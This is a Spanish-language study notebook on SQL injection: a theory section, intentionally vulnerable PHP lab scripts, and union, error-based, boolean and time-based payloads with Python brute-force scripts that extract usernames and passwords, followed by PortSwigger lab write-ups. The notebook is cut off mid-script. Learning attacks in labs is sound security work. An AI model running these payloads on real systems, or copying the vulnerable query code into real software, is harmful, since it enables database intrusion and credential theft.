-----------
**SQL Injection** (**SQLI**) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que **no validan adecuadamente** la entrada del usuario en la consulta SQL que se envía a la base de datos. Los atacantes pueden utilizar esta técnica para ejecutar consultas SQL maliciosas y obtener información confidencial, como nombres de usuario, contraseñas y otra información almacenada en la base de datos.

Las inyecciones SQL se producen cuando los atacantes insertan código SQL malicioso en los campos de entrada de una aplicación web. Si la aplicación no valida adecuadamente la entrada del usuario, la consulta SQL maliciosa se ejecutará en la base de datos, lo que permitirá al atacante obtener información confidencial o incluso controlar la base de datos.

Hay varios tipos de inyecciones SQL, incluyendo:

- **Inyección SQL basada en errores**: Este tipo de inyección SQL aprovecha **errores en el código SQL** para obtener información. Por ejemplo, si una consulta devuelve un error con un mensaje específico, se puede utilizar ese mensaje para obtener información adicional del sistema.
- **Inyección SQL basada en tiempo**: Este tipo de inyección SQL utiliza una consulta que **tarda mucho tiempo en ejecutarse** para obtener información. Por ejemplo, si se utiliza una consulta que realiza una búsqueda en una tabla y se añade un retardo en la consulta, se puede utilizar ese retardo para obtener información adicional
- **Inyección SQL basada en booleanos**: Este tipo de inyección SQL utiliza consultas con **expresiones booleanas** para obtener información adicional. Por ejemplo, se puede utilizar una consulta con una expresión booleana para determinar si un usuario existe en una base de datos.
- **Inyección SQL basada en uniones**: Este tipo de inyección SQL utiliza la cláusula “**UNION**” para combinar dos o más consultas en una sola. Por ejemplo, si se utiliza una consulta que devuelve información sobre los usuarios y se agrega una cláusula “**UNION**” con otra consulta que devuelve información sobre los permisos, se puede obtener información adicional sobre los permisos de los usuarios.
- **Inyección SQL basada en stacked queries**: Este tipo de inyección SQL aprovecha la posibilidad de **ejecutar múltiples consultas** en una sola sentencia para obtener información adicional. Por ejemplo, se puede utilizar una consulta que inserta un registro en una tabla y luego agregar una consulta adicional que devuelve información sobre la tabla.

Cabe destacar que, además de las técnicas citadas anteriormente, existen muchos otros tipos de inyecciones SQL. Sin embargo, estas son algunas de las más populares y comúnmente utilizadas por los atacantes en páginas web vulnerables.

Asimismo, es necesario hacer una breve distinción de los diferentes tipos de bases de datos existentes:

- **Bases de datos relacionales**: Las inyecciones SQL son más comunes en bases de datos relacionales como MySQL, SQL Server, Oracle, PostgreSQL, entre otros. En estas bases de datos, se utilizan consultas SQL para acceder a los datos y realizar operaciones en la base de datos.
- **Bases de datos NoSQL**: Aunque las inyecciones SQL son menos comunes en bases de datos NoSQL, todavía es posible realizar este tipo de ataque. Las bases de datos NoSQL, como MongoDB o Cassandra, no utilizan el lenguaje SQL, sino un modelo de datos diferente. Sin embargo, es posible realizar inyecciones de comandos en las consultas que se realizan en estas bases de datos. Esto lo veremos unas clases más adelante.
- **Bases de datos de grafos**: Las bases de datos de grafos, como Neo4j, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los nodos y relaciones que se han almacenado en la base de datos.
- **Bases de datos de objetos**: Las bases de datos de objetos, como db4o, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los objetos que se han almacenado en la base de datos.

Es importante entender los diferentes tipos de inyecciones SQL y cómo pueden utilizarse para obtener información confidencial y controlar una base de datos. Los desarrolladores deben asegurarse de validar adecuadamente la entrada del usuario y de utilizar técnicas de defensa, como la sanitización de entrada y la preparación de consultas SQL, para prevenir las inyecciones SQL en sus aplicaciones web.

A continuación, se proporciona el enlace a la utilidad online de ‘**ExtendsClass**‘ que utilizamos en esta clase:

- **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)

## Notas Practica

Vamos a ver diferentes comandos con los cuales se administra o se usa de forma básica en una base de datos de tipo mysql.

### Comandos Básicos de MySQL

| Categoría         | Comando                                               | Descripción                      |
| ----------------- | ----------------------------------------------------- | -------------------------------- |
| **Conexión**      | `mysql -u usuario -p`                                 | Conectar a MySQL                 |
|                   | `mysql -h host -u usuario -p`                         | Conectar a servidor remoto       |
| **Base de Datos** | `SHOW DATABASES;`                                     | Mostrar todas las bases de datos |
|                   | `CREATE DATABASE nombre_db;`                          | Crear nueva base de datos        |
|                   | `USE nombre_db;`                                      | Seleccionar base de datos        |
|                   | `DROP DATABASE nombre_db;`                            | Eliminar base de datos           |
| **Tablas**        | `SHOW TABLES;`                                        | Mostrar tablas de la BD actual   |
|                   | `DESCRIBE nombre_tabla;`                              | Mostrar estructura de tabla      |
|                   | `CREATE TABLE...`                                     | Crear nueva tabla                |
|                   | `DROP TABLE nombre_tabla;`                            | Eliminar tabla                   |
| **Consultas**     | `SELECT * FROM tabla;`                                | Seleccionar todos los registros  |
|                   | `INSERT INTO tabla...`                                | Insertar nuevos registros        |
|                   | `UPDATE tabla SET...`                                 | Actualizar registros             |
|                   | `DELETE FROM tabla...`                                | Eliminar registros               |
| **Usuarios**      | `CREATE USER 'user'@'host' IDENTIFIED BY 'password';` | Crear usuario                    |
|                   | `GRANT privilegios ON db.* TO 'user'@'host';`         | Otorgar permisos                 |
|                   | `REVOKE privilegios ON db.* FROM 'user'@'host';`      | Revocar permisos                 |
|                   | `SHOW GRANTS FOR 'user'@'host';`                      | Mostrar permisos de usuario      |
| **Backup**        | `mysqldump -u usuario -p nombre_db > backup.sql`      | Exportar base de datos           |
|                   | `mysql -u usuario -p nombre_db < backup.sql`          | Importar base de datos           |
| **Información**   | `SELECT VERSION();`                                   | Mostrar versión de MySQL         |
|                   | `STATUS;`                                             | Mostrar estado del servidor      |
|                   | `SHOW PROCESSLIST;`                                   | Mostrar procesos activos         |
| **Salir**         | `EXIT;` o `QUIT;`                                     | Salir de MySQL                   |
En este punto lo que se va a hacer es crear un pequeño script en php con el cual se practicara algunos ataques básicos de tipo SQLI.

**script v1**:
```php
<?php
  // Pemiten visualizar los erroes
  error_reporting(E_ALL);
  ini_set('display_errors',1);

  $server = "localhost";
  $username = "stark";
  $password = "stark123";
  $database = "Hack4u";

  // Conexión a la base de datos
  $conn = new mysqli($server, $username, $password, $database);

  $id= $_GET['id']; // Se recive mediante el parametro id por GET su valor.

  $data = mysqli_query($conn, "select username from users where id = '$id'") or die(mysqli_error($conn)); // Creación de la query y desde el or es para ver los errores

  $response = mysqli_fetch_array($data); // la respuesta de la transfoma en una especie de array, mediante la cual se podra filtrar.

  echo $response['username'];

?>

```

Tomando en cuenta que la petición se esta enviando mediante: `select username from users where id = '1'`, que pasara cuando agreguemos una comilla al final `select username from users where id = '1''` esa comilla extra causara un error en la consulta ya que queda una comilla suelta por lo que dará un error. y veremos algo parecido a lo siguiente:

![[Pasted image 20250823192024.png]]

vamos a encontrarnos con webs que al igual que vemos ahora nos reporta los errores y son las **Inyección SQL basada en errores** de la  cual podemos aprovecharnos.

Lo primero que se suele hacer al ver este error es un ordenamiento para identificar el numero de datos de la siguiente manera:
```sqli
http://localhost/searchUsers.php?id=1'order by 100 -- -
```

el propósito es encontrar el valor exacto, es por eso que empezamos con un numero muy grande y luego vamos disminuyendo en nuestro caso será 1:

```sqli
http://localhost/searchUsers.php?id=1'order by 1 -- -
```

![[Pasted image 20250823201714.png]]

ahora como vemos no tiene errores porque la petición es válida, con esto claro lo que vamos a hacer es tratar de ingresar un valor, y para poder ver dicho valor se suele poner un valor inexistente donde se supone que se imprime en este caso el id y quedaría de la siguiente manera:

```sqli
http://localhost/searchUsers.php?id=1'union select "hola" -- -
```

![[Pasted image 20250823201926.png]]

Como podemos observar inyectamos información y en un comienzo esto no es tan grave pero puede convertirse en un problema grave si por ejemplo tratamos de ver la base de datos en uso:

```sqli
http://localhost/searchUsers.php?id=1'union select database() -- -
```

![[Pasted image 20250823202141.png]]

como podemos observar al parecer logramos inyectar otra query la cual es valida y se interpreta y responde con esto notros ya podemos comenzar a filtrar información de la base de datos de la siguiente manera:

```sqli
http://localhost/searchUsers.php?id=100'union select schema_name from information_schema.schemata limit 1,1 -- -
```

![[Pasted image 20250823202854.png]]

Como vemos ya logramos listar las bases de datos en uso y ya podemos tratar de ver las tablas para una de ellas en nuestro caso la de Hack4u de la siguiente manera:

```sqli
http://localhost/searchUsers.php?id=100' union select table_name from information_schema.tables where table_schema='Hack4u'-- -
```

![[Pasted image 20250823203120.png]]

como podemos ver nos lista la tabla de users, ahora con esto podemos listar sus columnas para ver que contiene de la siguiente manera:

```sqli
http://localhost/searchUsers.php?id=100' union select column_name from information_schema.columns where table_schema="Hack4u" and table_name="users"-- -
```

![[Pasted image 20250823203335.png]]

en este caso nos lista una pero recordemos que podemos tener varias para esto vamos a provecharnos de `group_concat` para ver todas separadas por `,` :

![[Pasted image 20250823203358.png]]

Como podemos ver ya listamos todas las columnas disponibles en la tabla users, ahora vamos a apuntar directamente a su contenido para ver  que podemos obtener:

```sqli
http://localhost/searchUsers.php?id=100' union select group_concat(username,':',password) from users-- -
```

![[Pasted image 20250823203653.png]]

Como podemos observar hemos obtenido toda la información de la base de datos y ya tenemos todas las credenciales de la base de datos.

Ahora vamos a otro caso donde no podemos ver los errores y para esto vamos con la version 2 de nuestro script en php:

```php
<?php
  $server = "localhost";
  $username = "stark";
  $password = "stark123";
  $database = "Hack4u";

  // Conexión a la base de datos
  $conn = new mysqli($server, $username, $password, $database);

  $id= $_GET['id']; // Se recive mediante el parametro id por GET su valor.

  $data = mysqli_query($conn, "select username from users where id = '$id'")

  $response = mysqli_fetch_array($data); // la respuesta de la transfoma en una especie de array, mediante la cual se podra filtrar.

  echo $response['username'];

?>
```

En este caso no vamos a poder ver los errores por lo tanto estamos en una **Inyección SQL sin errores** aunque con un poco de astucia no estaremos a ciegas:

El principio es el mismo, vamos a realizar el ordenamiento a ver que obtenemos:

```sqli
http://localhost/searchUsers.php?id=1' order by 1-- -
```

![[Pasted image 20250823204349.png]]

En este caso parecido al anterior donde vemos que si el valor del ordenamiento es correcto el usuario no aparece y si no no lo hace.

Ahora podemos intentar ingresar valores a ver que sucede:

```sqli
http://localhost/searchUsers.php?id=100' union select "Hola"-- -
```

![[Pasted image 20250823204618.png]]

Vemos que al igual que el anterior ya es prácticamente igual y podemos continuar como el anterior.

Otra forma de comprobar si la web es vulnerable a una sqli es con el `and sleep(5)-- -` donde si se interpreta la web tardara 5 segundos en responder:

```sqli
http://localhost/searchUsers.php?id=1' and sleep(5)-- -
```

En este caso puede darse una SQLI basada en tiempo.

En muchas ocasiones los Desarrolladores lo hacen de forma excepcional y para esto usaremos la versión 3 del script:

```php
<?php
  $server = "localhost";
  $username = "stark";
  $password = "stark123";
  $database = "Hack4u";

  // Conexión a la base de datos
  $conn = new mysqli($server, $username, $password, $database);

  $id= mysqli_real_escape_string($conn, $_GET['id']); // Se recive mediante el parametro id por GET su valor.

  echo "[+] Tu valor introducido es: " . $id . "<br>----------------------------------<br>";

  $data = mysqli_query($conn, "select username from users where id = $id");

  $response = mysqli_fetch_array($data); // la respuesta de la transfoma en una especie de array, mediante la cual se podra filtrar.

  echo $response['username'];

?>
```

en este caso si intentamos una SQLI vamos a ver lo siguiente:

```sqli
http://localhost/searchUsers.php?id=9' union select 1-- -
```

![[Pasted image 20250823205243.png]]

Como podemos observar nos esta escapando la comilla y esto ya por defecto va a evitar la SQLI.

Pero algo que tenemos que siempre tener en cuenta es que no todas las SQLI van a empezar con una `'` puede darse el caso de que los desarrolladores por algún tipo de error envíen `select username from users where id = $id` y no `select username from users where id = '$id'` que seria lo correcto lo que provoca que no sea necesario el uso de la comilla como podremos observar:

```sqli
http://localhost/searchUsers.php?id=9 union select 1-- -
```

![[Pasted image 20250823205729.png]]

Como vemos esto ya es valido y desde allí podremos continuar de forma igual.

Ahora en ocasiones vamos a tener un diferente tipo de SQLI que serán las **SQLI Ciegas** donde no podremos ver nada en la web y para esto usaremos la version 4 del script:

```php
<?php
  $server = "localhost";
  $username = "stark";
  $password = "stark123";
  $database = "Hack4u";

  // Conexión a la base de datos
  $conn = new mysqli($server, $username, $password, $database);

  $id= mysqli_real_escape_string($conn, $_GET['id']); // Se recive mediante el parametro id por GET su valor.

  echo "[+] Tu valor introducido es: " . $id . "<br>----------------------------------<br>";

  $data = mysqli_query($conn, "select username from users where id = $id");

  $response = mysqli_fetch_array($data); // la respuesta de la transfoma en una especie de array, mediante la cual se podra filtrar.

  if (! isset($response['id'])){
    http_response_code(404);
  }
?>
```

En el caso de esta web vamos a ver que no logramos ver absolutamente nada:

![[Pasted image 20250823210238.png]]

pero en este caso vamos a analizarlo con ayuda de curl para poder ver los código de estado de la siguiente manera:

```bash
curl -s -X GET "http://localhost/searchUsers.php?id=1" -I
```

![[Pasted image 20250823210736.png]]

En este caso vemos que cuando es un id valido tenemos un `200OK` pero cuando es uno no valido veremos:

![[Pasted image 20250823210817.png]]

Estos serán pequeños identificadores por lo que que vamos a guiarnos para saver si estamos realizando la SQLI, y son con estos indicadores vamos a llegar guiarnos por lo que se conoce como **SQLI por tiempo** o **SQLI por condicional**.

En este caso vamos a complicarlo un poco mas y vamos a intentar hacer una por condicional de la siguiente manera:

Veamos primero el siguiente ejemplo donde vamos a hacer uso de `substring` para realizar la condición:
```sqli
select(select substring(username,1,1) from users where id = 1)='a';
```

![[Pasted image 20250823211846.png]]

vemos que la comparación es exitosa ya que 1 es correcto y 0 es incorrecto recordemos que 1 hace referencia a admin y estamos filtrando por la primera letra osea la `a` y la comparamos con la `a` y como `a=a` entonces es correcto ahora intentemos con la b para ver que nos responde:

![[Pasted image 20250823212026.png]]

vemos que es 0 ya que si es incorrecto.

Como dato extra en el caso de que las comillas den problemas podemos trabajar con sus valores en ascii  de la siguiente manera:

```sqli
select(select ascii(substring(username,1,1)) from users where id = 1)=97;
```

Lo que hicimos es convertir la `a` en su valor ascii que seria el 97 y luego lo comparamos lo que nos da como resultado un correcto como lo vemos en la siguiente imagen:

![[Pasted image 20250823212335.png]]

Ahora tomando esto como concepto podemos aplicarlo a nuestro ejercicio de la siguiente manera donde vamos aprovechar lo que tenemos y lo del código de estado.

```sqli
curl -s -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9 or (select(select ascii(substring(username,1,1)) from users where id=1)=97)" -I
```

![[Pasted image 20250823212835.png]]

Como podemos observar el lo que le decimos de forma general es si id=9 o 97=97 y como una si es correcta nos permite pasar. Ahora el problema radica en que hacer esto obviamente va ser una tortura y muy tardado y es aquí donde entra python a salvar el día donde nuestro script va a quedar de la siguiente manera:

```python
#!/usr/bin/python3

import requests
import signal
import sys
import string
import time
from pwn import *

# Ctrl_C
def def_handler(sig, frame):
    print("\n\n[!] Saliendo....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Globla Var

main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando proceso de fuerza Bruta")

    time.sleep(1)

    p2 = log.progress("Datos Extraidos")
    data = ""

    for position in range(1, 100):
        for charter in range(33, 126):
            sqli_ulr = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id=1)=%d)" % (position, charter)

            p1.status(sqli_ulr)

            r = requests.get(sqli_ulr)

            if r.status_code == 200:
                data += chr(charter)
                p2.status(data)
                break

def main():

    makeSQLI()


if __name__ == '__main__':
    main()
```

y la ejecución se ve de la siguiente manera:

![[Pasted image 20250823222226.png]]

Ahora podemos también replicar este tipo de SQLI por tiempo de igual forma con ayuda de python de la siguiente manera:

primero identificar si podemos definir un tiempo de carga en la web mediante la SQLI de la siguiente menera:

```sqli
http://localhost/searchUsers.php?id=9' and sleep(5)-- -
```

![[Pasted image 20250823222417.png]]

en el caso de la basadas en tiempo usamos and ya que si es correcta va a demorar el tiempo en cargar y si no pues no demora.

En el caso de que la web se demore en cargar el tiempo que se define entonces funciona una SQLI basada en tiempo y esto también lo podemos automatizar en python de la siguiente manera:

```python
#!/usr/bin/python3

import requests
import signal
import sys
import string
import time
from pwn import *

# Ctrl_C
def def_handler(sig, frame):
    print("\n\n[!] Saliendo....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Globla Var

main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando proceso de fuerza Bruta")

    time.sleep(1)

    p2 = log.progress("Datos Extraidos")
    data = ""

    for position in range(1, 100):
        for charter in range(33, 126):
            sqli_ulr = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)" % (position, charter)

            p1.status(sqli_ulr)

            time_star = time.time()

            r = requests.get(sqli_ulr)

            time_end = time.time()

            if time_end - time_star > 0.35:
                data += chr(charter)
                p2.status(data)
                break

def main():

    makeSQLI()


if __name__ == '__main__':
    main()

```

`if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)` lo mas complicado de entender es el if donde su estructura seria la siguiente:
`if(<condicional>,<si se cumple>, <si no se cumple>)` entonces con esta forma es mas fácil darse cuenta que si la condición se cumple entonces tenemos el tiempo de espera y si no pues no lo tenemos, nosotros en el if ya de python lo que tenemos es un control de tiempo así como revisamos el código de estado ahora revisamos el tiempo que se demoro en cargar con esto identificamos los caracteres correcto y el resultado es el siguiente:

![[Pasted image 20250823224220.png]]

Con esto queda muy claro, con algunos ejemplos de como se explota de forma básica algunos SQLI


## Notas PortSwigger

### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

![[Pasted image 20250902160701.png]]

La inyección se encontraba dentro las categorías inyectarla.

### Lab: SQL injection vulnerability allowing login bypass

![[Pasted image 20250902161112.png]]

Logramos mediante una inyección simple dentro del panel de login entrar como admin.

### Lab: SQL injection attack, querying the database type and version on Oracle
![[Pasted image 20250902161939.png]]
Realizamos el ordenamiento para identificar el valor de datos que en este caso es de 2.

![[Pasted image 20250902162227.png]]
Algo importante a destacar y a tener en cuenta es que en las bases de datos del tipo ORACLE siempre vamos a tener que apuntar a una tabla, en este caso casi siempre existe una llamada `dual` a la cual podemos apuntar para que la query funcione.

![[Pasted image 20250902162606.png]]
Podemos observar como ya con esto logramos también ver la versión de la base de datos ORACLE y tenemos el lab completado.

### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

![[Pasted image 20250902162944.png]]
Aquí de igual forma podemos ver que tenemos el ordenamiento correcto que es 2.

![[Pasted image 20250902163044.png]]
Podemos ver que estamos inyectando la información en la web.

![[Pasted image 20250902163146.png]]
Y por ultimo podemos ver que ya logramos listar de forma correcta lo que son las versiones esto tanto para `MYSQL` como para `MICROSOFT SQL`.

### Lab: SQL injection attack, listing the database contents on non-Oracle databases

![[Pasted image 20250902163736.png]]
Primero realizamos el ordenamiento como de costumbre de forma correcta.

![[Pasted image 20250902164341.png]]
Vemos si podemos inyectar información en la web y vemos que si por lo que procedemos a intentar la enumeración de bases de datos.

Ahora vamos a comenzar con la enumeración de las bases de datos existentes, pero para ver por completo las inyecciones vamos a hacerlo con ayuda de BurpSuite:
![[Pasted image 20250902200642.png]]

Ya tenemos la lista de bases de datos de la cual vamos a seguir enumerando la de `public`:
![[Pasted image 20250902213017.png]]
Vemos que tenemos una tabla `users_sbkzvo`, la cual vamos a ver sus columnas:

![[Pasted image 20250902213350.png]]

Ya tenemos las columnas como podemos ver.

Obtengamos ya los datos almacenados:
![[Pasted image 20250902213654.png]]
Como podemos observar logramos obtener credenciales almacenadas y las vamos a usar para iniciar sesión:

![[Pasted image 20250902213905.png]]
Podemos observar que logramos de forma exitosa completar el lab.

### Lab: SQL injection attack, listing the database contents on Oracle

Comenzamos con el ordenamiento de los datos:
![[Pasted image 20250902214356.png]]

Ya con esto claro, continuemos a comprobar si se logra ver información:
![[Pasted image 20250902214810.png]]
como recordatorio en las bases de datos oracle se tiene que siempre apuntar a una base de datos valida, es por eso que usamos dual ya que es una que casi siempre se encuentra en las oracle.

Ahora que podemos ver que la información se representa en la web podemos intentar listar la base de datos:
![[Pasted image 20250903094710.png]]
En este caso no es como en `MySQL u otras` donde se puede listar de las bases de datos de forma especifica, en este caso lo que podemos hacer es listar todas las tablas existentes por lo que es mas tedioso y tenemos mucho output pero podemos filtrar y encontrar lo que necesitemos en este caso la de `USERS_ZJRTYM` por lo que vamos a continuar intentado ver sus columnas:

![[Pasted image 20250903095034.png]]
En este caso como podemos observar logramos obtener las columnas necesarias para filtrar por usuarios y contraseñas por lo que procederemos a intentar ver el contenido dentro de estas:
![[Pasted image 20250903095239.png]]
Como podemos observar ya tenemos las credenciales del usuario administrador por lo que vamos a intentar terminar el lab con esto:

![[Pasted image 20250903095342.png]]
Lab terminado.

### Lab: SQL injection UNION attack, determining the number of columns returned by the query

![[Pasted image 20250903095627.png]]
Listo podemos observar que logramos un ordenamiento de datos validos, por lo que con esto podemos intentar ver si la información se representa en la web.

![[Pasted image 20250903095858.png]]
Vemos que completamos la maquina ya que logramos encontrar el numero de columnas en uso por lo que lab completado.

### Lab: SQL injection UNION attack, finding a column containing text

Comenzamos con un ordenamiento de columnas:
![[Pasted image 20250903120155.png]]

Con esto podemos proceder a ver en donde podemos inyectar información:
![[Pasted image 20250903120542.png]]
La segunda posición es en la que nos permite inyectar información por lo tanto lab  terminada.

### Lab: SQL injection UNION attack, retrieving data from other tables

Comenzamos ordenando las columnas y con un ataque normal con el objetivo de sacar información sensible:
![[Pasted image 20250903121711.png]]
Continuamos viendo si es inyectable información en la web:
![[Pasted image 20250903121821.png]]
Vemos que al parecer si podemos inyectar información y por el como es valida la petición quiero creer que es una `mysql` o `microsoft` por lo que ahora vamos a enumerar la base de datos:
![[Pasted image 20250903122007.png]]
Podemos ver como logramos obtener las bases de datos por lo que ahora vamos a enumerar la de `information_schema`:
![[Pasted image 20250903122303.png]]
Vemos la tabla users donde vamos a tratar de ver sus columnas:
![[Pasted image 20250903122409.png]]
Vemos dos columnas las cuales posiblemente tiene credenciales, vamos alistarlas con el objetivo de ver credenciales validas:
![[Pasted image 20250903122521.png]]
Perfecto ya tenemos credenciales validas por lo que vamos a ver si con esto logramos completar este lab.
![[Pasted image 20250903122602.png]]
Lab terminado.

### Lab: SQL injection UNION attack, retrieving multiple values in a single column

Comenzamos con el mismo método vamos primero con el ordenamiento:
![[Pasted image 20250903122830.png]]

Podemos observar como mediante un ordenamiento podemos obtener que el valor correcto es dos, así que continuamos:
![[Pasted image 20250903122952.png]]
Vemos que en este caso tenemos la inyección pero no tenemos los dos campos inyectables por lo que en este punto solo lo podemos inyectar en uno de ellos por o que con esto en mente vamos a proseguir enumerado la base de datos.

![[Pasted image 20250903123313.png]]
Podemos observar todas la bases de datos y vamos a enumerar la de `public` para ver sus tablas:
![[Pasted image 20250903123436.png]]
Podemos ver dos pero la que si nos llama la atención es users así que vamos a numerar sus columnas:
![[Pasted image 20250903123545.png]]
Excelente vemos  `username` y `password` con lo que podemos proceder a filtrar la información que nos intereza.

Antes de eso recordar que solo tenemos un campo y tenemos mas de un dato a representar, en casos así lo que podemos hacer es usar funciones como `group_concat` o `concat` para en un solo campo poder implementar todo, también suele implementarse el uso de pipes por lo que con `||` podemos implementar también los dos campos:
![[Pasted image 20250903123859.png]]
Listo ya tenemos credenciales que podemos usar, veamos si con esto completamos el lab:
![[Pasted image 20250903123941.png]]
Lab terminado.

### Lab: Blind SQL injection with conditional responses

Al igual que los anteriores podemos intentar primero realizar un ordenamiento:

![[Pasted image 20250903130905.png]]

Vemos que a diferencia de los anteriores no se corrompe la web, en este caso lo que vamos a hacer es primero realizar un análisis con BurpSuite:

![[Pasted image 20250903132452.png]]
Podemos ver como en la petición logramos encontrar mas campos como en este caso el de `TrakingId` el cual si se le puede realizar una inyección la cual nos quita de alguna manera parte del contenido de la web, nosotros podemos guiarnos si de alguna manera vemos que cambia la web de forma visual o si revisamos en la respuesta veremos que su contenido cambia tambien:

Antes:
![[Pasted image 20250903133315.png]]

Después:
![[Pasted image 20250903133359.png]]

Como podemos observar ya tenemos un cambio de contenido en la web, esto también puede ser un indicador, en este punto lo que vamos a intentar ver la lógica de la inyección:
![[Pasted image 20250903134844.png]]
Okey por la respuesta entiendo que si forzamos a la petición a ser correcta entonces podremos ver el `Welcome back!`, en este punto lo que voy a hacer es comenzar a armar un  query valida:

![[Pasted image 20250903135102.png]]
Podemos hacer comparaciones pequeñas de letras y esto es muy util ya que podemos ver si podemos desarmar una palabra e ir comparando las letras:

![[Pasted image 20250903135214.png]]
Perfecto, en este punto lo que vamos a intentar es que no sea una palabra que nosotros designemos sino una que se arrastre del servidor y como solo es un campo vamos a jugar con `group_concat` para que se representen en mi caso todas las bases de datos en una sola linea:
![[Pasted image 20250903144959.png]]

Vemos que no se puedo usar `group_concat` en esta ocasión, no me lo permitió pero mediante limit logramos limitar la respuesta de la web de todas las bases solo a la primera y esta parece si ser valida, entonces con ayuda del intruder vamos a ver si podemos obtener la primera letra de la primera db que se lista:
![[Pasted image 20250903145341.png]]

Vemos que logramos encontrar la primera letra de la primera tabla, esto es grandioso ya encontramos una forma de ir listando por información, el como identificamos sin necesidad de abrir cada petición es por la longitud en la respuesta como vemos cuando prueba la letra `p` su longitud es muy distinta.

En este punto lo mas optimo es la creación de un Script en python para por medio de un ataque de fuerza bruta ver la información y es script nos queda de la siguiente manera:
```python
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, string, time

#CTRL_C
def def_handler(seg,frame):
    print("\n\n[!] Saliendo......\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-;,"
main_url="https://0a41004904ed20df8740a45800cf00ac.web-security-academy.net/filter?category=Pets"
cookies = {"TrackingId": "",
           "session":"FeE2AJZAeY37MCexFurR5h9P5Lw9mIgE"}

def sqlInyection():

    data=""

    p1 = log.progress("Brute Force")

    p2 = log.progress("Data")

    for position in range(1, 15):
        for character in characters:
            payload = "DCsBgQO0gx0t0ZNW'and (select substring((select schema_name from information_schema.schemata limit 1),%d,1))='%s'-- -" % (position, character)
            cookies['TrackingId'] = payload

            p1.status(payload)

            r = requests.get(main_url, cookies=cookies)

            if "Welcome back!" in r.text:
                data+=character
                p2.status(data)
                break

def main():

    sqlInyection()

if __name__ == '__main__':
    main()
```

Vemos como esto nos ayudo a obtener la primera db:
![[Pasted image 20250903154531.png]]

perfecto, en este punto es cuestión de modificar el payload para listar las siguientes, en este caso vamos a hacer uso de `offset` para listar las que faltan y el payload quedaría de la siguiente manera:
```python
payload = "DCsBgQO0gx0t0ZNW'and (select substring((select schema_name from information_schema.schemata limit 1 offset 1),%d,1))='%s'-- -" % (position, character)
```

y obtenemos:
![[Pasted image 20250903154810.png]]

Como vimos en los demás laboratorios la db `public` es la usada para almacenar los datos, podemos intentar ahora listar tablas:
```python
payload = "DCsBgQO0gx0t0ZNW'and (select substring((select table_name from information_schema.tables where table_schema='public' limit 1 offset 0),%d,1))='%s'-- -" % (position, character)
```

De forma general podemos ver como es la petición y esto con paciencia tenemos que encontrar alguna util, en nuestro caso tenemos suerte y la primera nos da la de `users`:
![[Pasted image 20250903155408.png]]

Como podemos ver  en este punto vamos a comenzar a enumerar lo que son las columnas de la base de datos y para esto nuestro payload queda de la siguiente manera:
```python
payload = "DCsBgQO0gx0t0ZNW'and (select substring((select column_name from information_schema.columns where table_schema='public' and table_name='users' limit 1 offset 0),%d,1))='%s'-- -" % (position, character)
```

Vamos a ver que tenemos en la primera columna:
![[Pasted image 20250903160601.png]]

Vemos la columna username, podemos ahora filtrar por la siguiente a ver que encontramos:
```python
payload = "DCsBgQO0gx0t0ZNW'and (select substring((select column_name from information_schema.columns where table_schema='public' and table_name='users' limit 1 offset 1),%d,1))='%s'-- -" % (position, character)
```

![[Pasted image 20250903161237.png]]

Vemos que tenemos otra columna llamada `password` ya con estas dos podemos sacar la información con el siguiente payload:
```python
payload = "DCsBgQO0gx0t0ZNW'and (select substring((select username||':'||password from users limit 1 offset 0),%d,1))='%s'-- -" % (position, character)
```

![[Pasted image 20250903164012.png]]

En este punto ya tenemos las credenciales de `administrator` por lo que vemos si con eso logramos completar el lab:
![[Pasted image 20250903164338.png]]
Listo lab completado.

### Lab: Blind SQL injection with conditional errors

![[Pasted image 20250903170117.png]]
Mediante el código de estado determinamos que el ordenamiento es 1.

Ahora vamos a proceder a intentar crear un petición que nos permita aprovecharnos del código de estado:
![[Pasted image 20250903170632.png]]
En este punto lo que hacemos es aprovecharnos de la comilla que nosotros abrimos y cerrarla, esto permite que la comilla que antes quedaba abierta se cierre y como la base de datos es oracle podemos jugar con los pipes para concatenar otra query como vemos en la imagen, recordar que en `Oracle` siempre tenemos que apuntar a una tabla existente, que por lo general es `dual`.

Con esto en mente en esta concatenación lo que vamos a hacer es jugar con una estructura del tipo `case` de la siguiente manera:
![[Pasted image 20250903174323.png]]

Podemos jugar de esta manera con el objetivo de ejecutar diferente código de estado según la situación, con esto en mente vamos a intentar listar al igual que en el lab anterior tablas y datos por partes, el lab nos da que usemos la tabla `users` y sabemos que un usuario valido es `administrator`, aprovechando esto podemos de la siguiente manera filtrar la contraseña:
![[Pasted image 20250903190924.png]]
si el match es correcto lo que vamos a ver es como se produce el error que estamos forzando, por lo que vamos a hacer uso del intruder para encontrar el primer valor y verificar si nuestra lógica es correcta:
![[Pasted image 20250903191435.png]]

vemos que al contrario de todas las demás el valor 5 nos da el error que estábamos esperado por lo que procedemos a crear al igual que el anterior un script en python que nos permita obtener la contraseña:
```python
#!/usr/bin/python3


from pwn import *
import signal, requests, sys, string


#CTRL + C
def def_handler(sig, fram):
    print("\n\n[+] Saliendo......\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url="https://0ac600250493465080e51207005f00a8.web-security-academy.net/"
characters = string.printable
cookies = {"TrackingId":"",
